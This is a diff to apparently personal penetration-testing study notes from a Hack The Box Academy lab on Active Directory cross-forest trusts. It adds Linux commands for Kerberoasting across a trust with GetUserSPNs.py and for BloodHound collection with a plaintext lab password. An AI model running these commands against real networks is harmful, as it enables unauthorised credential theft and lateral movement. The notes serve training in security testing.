@@ -198,6 +198,16 @@ Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samacco
 .\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
 ```
 
+### Linux 
+
+```shell
+# see spns
+GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
+
+# ask for TGS
+GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley  
+```
+
 ## Admin Password Re-Use & Group Membership
 - We may also see users or admins from `Domain A` as members of a group in `Domain B`.
 - Only `Domain Local Groups` allow security principals from outside its forest. and here is all built-in `Domain Local Groups`
@@ -220,6 +230,8 @@ Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samacco
 - **Case:** `FREIGHTLOGISTICS.LOCAL` and `INLANEFREIGHT.LOCAL` have bidirectional trust and we are in domain `INLANEFREIGHT.LOCAL` with comprmised `Domain admin` user and password reuse for another user in cross-forest
 
 
+
+### Windows 
 
 ```powershell
 # enumerate groups with users that do not belong to the domain
@@ -244,3 +256,18 @@ Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500
 Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator
 
 ```
+
+
+### Linux 
+
+```shell
+
+bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2
+zip -r ilfreight_bh.zip *.json
+
+bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u forend@inlanefreight.local -p Klmcargo2
+zip -r FREIGHTLOGISTICS_bh.zip *.json
+```
+
+after that we can click on `Users with Foreign Domain Group Membership` under the `Analysis` tab and select the source domain as `INLANEFREIGHT.LOCAL`
+![Screenshot 2024-07-10 at 00-23-38 Hack The Box - Academy](https://github.com/kiro6/penetration-testing-notes/assets/57776872/1cbdf3d6-3c7f-4114-aa4c-7eba525cdea6)
